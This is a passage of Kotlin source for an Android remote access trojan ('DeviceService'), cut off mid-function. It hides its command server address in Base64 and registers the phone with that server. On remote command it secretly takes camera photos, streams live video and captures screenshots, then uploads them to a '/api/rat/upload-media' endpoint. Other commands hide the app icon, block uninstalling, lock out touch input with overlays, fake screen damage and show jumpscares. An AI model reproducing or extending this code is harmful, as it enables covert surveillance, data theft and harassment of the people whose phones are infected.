package com.sync.xxx

import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Matrix
import android.graphics.Paint
import android.graphics.Path
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

companion object {
    const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
    const val EXTRA_COMMAND        = "command"
    const val EXTRA_VALUE          = "value"
    const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
    const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
    const val EXTRA_STATUS_JSON    = "statusJson"

    val SERVER_URL: String get() = String(android.util.Base64.decode(
        "aHR0cDovL2NvbnNvbGUubWl1bnRlY2gubXkuaWQ6NTAyMA==",
        android.util.Base64.DEFAULT
    )).trim()
    const val CHANNEL_ID = "sync_xxx"
    const val NOTIF_ID   = 1
}

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    // ✅ TETAP: cameraManager dibutuhkan untuk Flashlight (torch)
private var cameraProvider: ProcessCameraProvider? = null
private var imageAnalysis: ImageAnalysis? = null
private var isStreamingCamera = false
private var cameraFacing = "front"
private var hackScreenView: android.view.View? = null
private var killSystemView: android.view.View? = null
private var isKillSystemActive = false
private var cameraManager: CameraManager? = null
private var torchCameraId: String? = null
private var flashHandler: Handler? = null
private var flashRunnable: Runnable? = null
private var flashBlinking = false


private val localReceiver = object : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        when (intent.action) {
            ACTION_CONNECT -> {
                if (socket == null || socket?.connected() == false) connectSocket()
            }
            ACTION_SEND_STATUS -> {
                val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                emitStatus(JSONObject(json))
            }
        }
    }
}

override fun onCreate() {
    super.onCreate()
    createNotificationChannel()

    // 🔥 FIX: cukup SPECIAL_USE karena manifest sudah minimalis
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
    startForeground(
        NOTIF_ID,
        buildNotification(),
        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
    )
} else {
    startForeground(NOTIF_ID, buildNotification())
}

    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

    deviceId = android.provider.Settings.Secure.getString(
        contentResolver,
        android.provider.Settings.Secure.ANDROID_ID
    ).takeIf { !it.isNullOrBlank() } ?: Build.ID

    val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
    val model = Build.MODEL
    deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

    cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
    torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
        cameraManager?.getCameraCharacteristics(id)
            ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
    }

    val filter = IntentFilter().apply {
        addAction(ACTION_CONNECT)
        addAction(ACTION_SEND_STATUS)
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
    } else {
        registerReceiver(localReceiver, filter)
    }

    connectSocket()
    scheduleWatchdog()
}

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

socket?.on(Socket.EVENT_DISCONNECT) {
    Log.d("DeviceService", "Socket disconnected — retry 5s")
    SocketHolder.connected = false
    Handler(Looper.getMainLooper()).postDelayed({
        if (socket?.connected() != true) connectSocket()
    }, 5000L)
}

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }
    
    private fun scheduleWatchdog() {
    try {
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(
            this, 0,
            Intent(this, WatchdogReceiver::class.java).apply {
                action = "com.sync.xxx.WATCHDOG"
            },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        am.setInexactRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 15 * 60 * 1000L,
            15 * 60 * 1000L,
            pi
        )
        Log.d("DeviceService", "watchdog scheduled")
    } catch (e: Exception) {
        Log.e("DeviceService", "scheduleWatchdog: ${e.message}")
    }
}

    private fun handleCommand(cmd: String, value: String) {
    when (cmd) {
        "flashlight" -> setFlashlight(value == "true")
        "lockDevice" -> lockDevice(value)
        "lockCustom" -> lockCustom(value)
        "unlockDevice" -> unlockDevice()
        "photo_front" -> capturePhoto("front")
        "photo_back" -> capturePhoto("back")
        "liveCameraFront" -> startLiveCamera("front")
        "liveCameraBack" -> startLiveCamera("back")
        "liveCameraStop" -> stopLiveCamera()
        "takeScreenshot" -> takeScreenshot()
        "hackScreenStart" -> startHackScreen(value)
        "hackScreenStop" -> stopHackScreen()
        "killSystemStart" -> startKillSystem()
        "killSystemStop" -> stopKillSystem()
        "changeTheme" -> changeTheme(value)
        "setWallpaper" -> setWallpaperFromUrl(value)
        "openUrl" -> openUrl(value)
        "playAudio" -> playAudio(value)
        "jumpscareStart" -> startJumpscare(value)
        "jumpscareStop" -> stopJumpscare()
        "vibrate" -> vibrateDevice(value)
        "showToast" -> showToast(value)
        "dialogSpam" -> startDialogSpam(value)
        "dialogSpamStop" -> stopDialogSpam()
        "videoOverlay" -> startVideoOverlay()
        "videoOverlayHide" -> stopVideoOverlay()
        "ttsSpeak" -> ttsSpeak(value)
        "ttsStop" -> ttsStop()
        "hideIcon" -> hideAppIcon(value == "true")
        "muteVolume" -> setVolumeMute(value == "true")
        "jumpscare2Start" -> startJumpscare2(value)
        "jumpscare2Stop" -> stopJumpscare2()
        "setAntiUninstall" -> {
            AntiUninstallHelper.setEnabled(this, value == "true")
            emitStatus(JSONObject().apply {
                put("antiUninstall", value == "true")
                put("antiUninstallActive", AntiUninstallHelper.isAdminActive(this@DeviceService))
            })
        }
        "lcdDamageStart" -> startLcdDamage()
        "lcdDamageStop"  -> stopLcdDamage()
        "spamKeyboardStart" -> startSpamKeyboard()
        "spamKeyboardStop"  -> stopSpamKeyboard()
        "freezeScreenStart" -> startFreezeScreen()
        "freezeScreenStop"  -> stopFreezeScreen()
        else -> Log.d("DeviceService", "⚠️ Unknown command: $cmd")
    }
}
    
private fun capturePhoto(facing: String) {
    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA
                   else CameraSelector.DEFAULT_BACK_CAMERA
    if (isStreamingCamera) stopLiveCamera()

val future = ProcessCameraProvider.getInstance(this)

future.addListener({
    try {
        val provider = future.get()
        cameraProvider = provider

        val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .setTargetRotation(android.view.Surface.ROTATION_0)
                .build()

            provider.unbindAll()
            provider.bindToLifecycle(this, selector, imageCapture)

            imageCapture.takePicture(
                Executors.newSingleThreadExecutor(),
                object : ImageCapture.OnImageCapturedCallback() {
                    override fun onCaptureSuccess(image: ImageProxy) {
                        try {
                            val bmp = image.toBitmap()
                            val rotated = rotateBitmap(bmp, image.imageInfo.rotationDegrees)
                            val bos = ByteArrayOutputStream()
                            rotated.compress(Bitmap.CompressFormat.JPEG, 85, bos)
                            val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                            sendMediaToServer("photo_$facing", b64)
                            rotated.recycle()
                        } catch (e: Exception) {
                            Log.e("Camera", "convert fail: ${e.message}")
                        } finally {
                            try { image.close() } catch (_: Exception) {}
                            try { provider.unbindAll() } catch (_: Exception) {}
                        }
                    }
                    override fun onError(exc: ImageCaptureException) {
                        Log.e("Camera", "Capture failed: ${exc.message}")
                        try { provider.unbindAll() } catch (_: Exception) {}
                    }
                }
            )
        } catch (e: Exception) {
            Log.e("Camera", "Error binding: ${e.message}")
        }
    }, ContextCompat.getMainExecutor(this))
}

private fun rotateBitmap(bmp: Bitmap, degrees: Int): Bitmap {
    if (degrees == 0) return bmp
    val m = Matrix().apply { postRotate(degrees.toFloat()) }
    val out = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, m, true)
    if (out != bmp) bmp.recycle()
    return out
}

private fun startLiveCamera(facing: String) {
    if (isStreamingCamera) stopLiveCamera()
    isStreamingCamera = true
    cameraFacing = facing
    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA
                   else CameraSelector.DEFAULT_BACK_CAMERA

    val future = ProcessCameraProvider.getInstance(this)
    future.addListener({
        try {
            val provider = future.get()
            cameraProvider = provider

            imageAnalysis = ImageAnalysis.Builder()
                .setTargetResolution(Size(640, 480))
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                .build()

            imageAnalysis?.setAnalyzer(Executors.newSingleThreadExecutor()) { image ->
                if (!isStreamingCamera) { image.close(); return@setAnalyzer }
                try {
                    val bmp = image.toBitmap()
                    val rotated = rotateBitmap(bmp, image.imageInfo.rotationDegrees)
                    val scaled = Bitmap.createScaledBitmap(rotated, 480, 360, true)
                    if (scaled != rotated) rotated.recycle()
                    val bos = ByteArrayOutputStream()
                    scaled.compress(Bitmap.CompressFormat.JPEG, 60, bos)
                    scaled.recycle()
                    val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                    socket?.emit("camera:stream", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("facing", facing)
                        put("frame", b64)
                    })
                } catch (e: Exception) {
                    Log.e("LiveCam", "frame fail: ${e.message}")
                } finally {
                    try { image.close() } catch (_: Exception) {}
                }
            }

            provider.unbindAll()
            provider.bindToLifecycle(this, selector, imageAnalysis!!)
            emitStatus(JSONObject().apply {
                put("liveCameraActive", true)
                put("facing", facing)
            })
        } catch (e: Exception) {
            Log.e("Camera", "Live failed: ${e.message}")
            isStreamingCamera = false
        }
    }, ContextCompat.getMainExecutor(this))
}

private fun stopLiveCamera() {
    isStreamingCamera = false
    try { imageAnalysis?.clearAnalyzer() } catch (_: Exception) {}
    imageAnalysis = null
    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
    cameraProvider = null
    emitStatus(JSONObject().apply { put("liveCameraActive", false) })
}

private fun takeScreenshot() {
    if (!ScreenshotAccessibilityService.isRunning()) {
        Log.e("DeviceService", "takeScreenshot: accessibility belum aktif")
        emitStatus(JSONObject().apply {
            put("screenshot", false)
            put("screenshotReason", "accessibility_not_enabled")
        })
        return
    }
    ScreenshotAccessibilityService.requestScreenshot { b64 ->
        if (b64 == null) {
            Log.e("DeviceService", "takeScreenshot: gagal capture")
            emitStatus(JSONObject().apply {
                put("screenshot", false)
                put("screenshotReason", "capture_failed")
            })
            return@requestScreenshot
        }
        sendMediaToServer("screenshot", b64)
        emitStatus(JSONObject().apply {
            put("screenshot", true)
        })
    }
}

private fun sendMediaToServer(type: String, base64: String) {
    Thread {
        try {
            val url = java.net.URL("$SERVER_URL/api/rat/upload-media")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            val key: String = readKey()
if (key.isNotEmpty()) conn.setRequestProperty("x-auth-key", key)
            conn.doOutput = true
            
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("type", type)
                put("base64", base64)
            }
            conn.outputStream.write(json.toString().toByteArray())
            conn.responseCode // trigger
        } catch (e: Exception) { Log.e("Upload", e.message) }
    }.start()
}

// ─── FITUR HACK SCREEN (CORAT-CORET) ───
private fun startHackScreen(base64Image: String) {
    stopHackScreen()
    Handler(Looper.getMainLooper()).post {
        try {
            val bytes = Base64.decode(base64Image, Base64.DEFAULT)
            val bmp: Bitmap? = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            if (bmp == null) {
                Log.e("HackScreen", "decode base64 gagal")
                return@post
            }

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )

            val imgView = android.widget.ImageView(this@DeviceService).apply {
                setImageBitmap(bmp)
                scaleType = android.widget.ImageView.ScaleType.FIT_XY
                setBackgroundColor(Color.TRANSPARENT)
            }

            hackScreenView = imgView
            wm.addView(imgView, params)
            emitStatus(JSONObject().apply { put("hackScreenActive", true) })
        } catch (e: Exception) {
            Log.e("HackScreen", e.message ?: "unknown")
        }
    }
}

private fun stopHackScreen() {
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            hackScreenView?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        hackScreenView = null
    }
    emitStatus(JSONObject().apply { put("hackScreenActive", false) })
}

// ─── FITUR KILL SYSTEM (BLOCK TOUCH & NAV) ───
private fun startKillSystem() {
    if (isKillSystemActive) return
    isKillSystemActive = true

    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val view = android.view.View(this@DeviceService).apply {
                setBackgroundColor(Color.TRANSPARENT)
                setOnTouchListener { _, _ -> true }
            }
            killSystemView = view
            wm.addView(view, params)
            emitStatus(JSONObject().apply { put("killSystemActive", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startKillSystem: ${e.message}")
            isKillSystemActive = false
        }
    }
}

private fun stopKillSystem() {
    isKillSystemActive = false
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            killSystemView?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        killSystemView = null
    }
    emitStatus(JSONObject().apply { put("killSystemActive", false) })
}


    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }
    
    private var jumpscare2Handler: Handler? = null
   private var jumpscare2Runnable: Runnable? = null
   
   private var jumpscare2View: android.widget.ImageView? = null

private fun startJumpscare2(value: String) {
    stopJumpscare2()
    try {
        val obj      = JSONObject(value)
        val url      = obj.getString("url")
        val duration = obj.optLong("duration", 3000L)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        val imgView = android.widget.ImageView(this).apply {
            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        jumpscare2View = imgView

        Handler(Looper.getMainLooper()).post {
            wm.addView(imgView, params)
        }

        Thread {
            try {
                var redirectUrl = url
                var bmp: Bitmap? = null
                for (i in 0..4) {
                    val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 15000
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.setRequestProperty("Accept", "image/*")
                    conn.connect()
                    val code = conn.responseCode
                    if (code in 300..399) {
                        val loc = conn.getHeaderField("Location")
                        conn.disconnect()
                        if (loc != null) { redirectUrl = loc; continue } else break
                    }
                    val bytes = conn.inputStream.readBytes()
                    conn.disconnect()
                    bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    break
                }
                val finalBmp = bmp
                Handler(Looper.getMainLooper()).post {
                    if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "jumpscare2 img: ${e.message}")
            }
        }.start()

        jumpscare2Handler = Handler(Looper.getMainLooper())
        jumpscare2Runnable = Runnable {
            try { wm.removeView(imgView) } catch (_: Exception) {}
            jumpscare2View = null
            emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
        }
        jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

        emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

    } catch (e: Exception) {
        Log.e("DeviceService", "startJumpscare2: ${e.message}")
    }
}

private fun stopJumpscare2() {
    jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
    jumpscare2Handler  = null
    jumpscare2Runnable = null
    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
    jumpscare2View?.let {
        try { wm.removeView(it) } catch (_: Exception) {}
    }
    jumpscare2View = null
    emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
}


private fun startDialogSpam(value: String) {
    try {
        val text: String = try {
            JSONObject(value).optString("text", value)
        } catch (_: Exception) {
            value
        }
        startService(Intent(this, DialogSpamService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(DialogSpamService.ACTION_START).apply {
                putExtra(DialogSpamService.EXTRA_TEXT, text)
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startDialogSpam: ${e.message}")
    }
}

private fun stopDialogSpam() {
    val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
}



private fun ttsSpeak(value: String) {
    try {
        val obj = JSONObject(value)
        val svcIntent = Intent(this, TTSService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else startService(svcIntent)
        val intent = Intent(TTSService.ACTION_SPEAK).apply {
            putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
            putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
            putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
            putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
            setPackage(packageName)
        }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "ttsSpeak: ${e.message}")
    }
}

private fun ttsStop() {
    val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
}
    
    private fun startVideoOverlay() {
    try {
        startService(Intent(this, VideoOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(VideoOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("videoOverlayActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startVideoOverlay: ${e.message}")
    }
}

private fun stopVideoOverlay() {
    val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("videoOverlayActive", false) })
}

// ═══════════════════════════════════════════════════════════
// FITUR BARU: LCD DAMAGE (garis-garis rusak di overlay)
// ═══════════════════════════════════════════════════════════
private var lcdDamageView: android.view.View? = null
private var lcdDamageHandler: Handler? = null
private var lcdDamageRunnable: Runnable? = null
private var lcdDamageActive = false

private fun startLcdDamage() {
    if (lcdDamageActive) return
    lcdDamageActive = true

    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = resources.displayMetrics
            val w = metrics.widthPixels
            val h = metrics.heightPixels

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                w, h, type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            // Custom View: gambar ratusan garis random (LCD rusak)
            val view = LcdDamageView(this@DeviceService)
            lcdDamageView = view
            wm.addView(view, params)

            // Redraw berkala biar garis "hidup" (berkedip/moving)
            lcdDamageHandler = Handler(Looper.getMainLooper())
            lcdDamageRunnable = object : Runnable {
                override fun run() {
                    if (!lcdDamageActive) return
                    view.invalidate()
                    lcdDamageHandler?.postDelayed(this, 120)
                }
            }
            lcdDamageHandler?.post(lcdDamageRunnable!!)

            emitStatus(JSONObject().apply { put("lcdDamageActive", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startLcdDamage: ${e.message}")
            lcdDamageActive = false
        }
    }
}

private fun stopLcdDamage() {
    lcdDamageActive = false
    lcdDamageHandler?.removeCallbacks(lcdDamageRunnable ?: Runnable {})
    lcdDamageHandler = null
    lcdDamageRunnable = null
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            lcdDamageView?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        lcdDamageView = null
    }
    emitStatus(JSONObject().apply { put("lcdDamageActive", false) })
}

// ═══════════════════════════════════════════════════════════
// CUSTOM VIEW: LCD DAMAGE
// ═══════════════════════════════════════════════════════════
private class LcdDamageView(context: Context) : android.view.View(context) {
    private val paint = android.graphics.Paint().apply {
        style = android.graphics.Paint.Style.STROKE
        isAntiAlias = true
    }
    private val random = java.util.Random()

    override fun onDraw(canvas: android.graphics.Canvas) {
        super.onDraw(canvas)
        val w = width.toFloat()
        val h = height.toFloat()
        if (w <= 0 || h <= 0) return

        // Garis horizontal rusak (banyak)
        val hLines = 120
        for (i in 0 until hLines) {
            val y = random.nextFloat() * h
            val thickness = 1f + random.nextFloat() * 5f
            paint.strokeWidth = thickness
            paint.color = when (random.nextInt(4)) {
                0 -> android.graphics.Color.argb(120 + random.nextInt(80), 0, 0, 0)       // hitam
                1 -> android.graphics.Color.argb(100 + random.nextInt(100), 255, 255, 255) // putih
                2 -> android.graphics.Color.argb(100 + random.nextInt(100), 0, 200, 255)   // cyan
                else -> android.graphics.Color.argb(100 + random.nextInt(100), 255, 0, 150) // magenta
            }
            val startX = if (random.nextBoolean()) 0f else random.nextFloat() * w * 0.4f
            val endX = w - (if (random.nextBoolean()) 0f else random.nextFloat() * w * 0.4f)
            canvas.drawLine(startX, y, endX, y, paint)
        }

        // Garis vertikal rusak
        val vLines = 60
        for (i in 0 until vLines) {
            val x = random.nextFloat() * w
            val thickness = 1f + random.nextFloat() * 4f
            paint.strokeWidth = thickness
            paint.color = when (random.nextInt(3)) {
                0 -> android.graphics.Color.argb(80 + random.nextInt(80), 0, 0, 0)
                1 -> android.graphics.Color.argb(60 + random.nextInt(90), 255, 255, 255)
                else -> android.graphics.Color.argb(80 + random.nextInt(90), 0, 220, 255)
            }
            val startY = if (random.nextBoolean()) 0f else random.nextFloat() * h * 0.4f
            val endY = h - (if (random.nextBoolean()) 0f else random.nextFloat() * h * 0.4f)
            canvas.drawLine(x, startY, x, endY, paint)
        }

        // Blok pixel rusak (kotak-kotak kecil)
        val blocks = 200
        paint.style = android.graphics.Paint.Style.FILL
        for (i in 0 until blocks) {
            val bw = 4f + random.nextFloat() * 40f
            val bh = 4f + random.nextFloat() * 40f
            val x = random.nextFloat() * w
            val y = random.nextFloat() * h
            paint.color = when (random.nextInt(4)) {
                0 -> android.graphics.Color.argb(80 + random.nextInt(100), 0, 0, 0)
                1 -> android.graphics.Color.argb(80 + random.nextInt(100), 255, 255, 255)
                2 -> android.graphics.Color.argb(80 + random.nextInt(100), 0, 220, 255)
                else -> android.graphics.Color.argb(80 + random.nextInt(100), 255, 20, 100)
            }
            canvas.drawRect(x, y, x + bw, y + bh, paint)
        }

        // Glitch strip horizontal panjang
        for (i in 0 until 8) {
            val y = random.nextFloat() * h
            val hh = 10f + random.nextFloat() * 40f
            paint.color = android.graphics.Color.argb(150, 255, 255, 255)
            canvas.drawRect(0f, y, w, y + hh, paint)
        }

        paint.style = android.graphics.Paint.Style.STROKE
    }
}

// ═══════════════════════════════════════════════════════════
// FITUR BARU: SPAM KEYBOARD + TEKS "Babay Bung !!"
// ═══════════════════════════════════════════════════════════
private var spamKbActive = false
private var spamKbView: android.widget.TextView? = null
private var spamKbHandler: Handler? = null
private var spamKbRunnable: Runnable? = null
private var spamKbImeVisible = false
private var spamKbInputView: android.view.View? = null
private var spamKbInputManager: android.view.inputmethod.InputMethodManager? = null

private fun startSpamKeyboard() {
    if (spamKbActive) return
    spamKbActive = true

    Handler(Looper.getMainLooper()).post {
        try {
            // 1. Overlay TextView "Babay Bung !!" di tengah layar
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
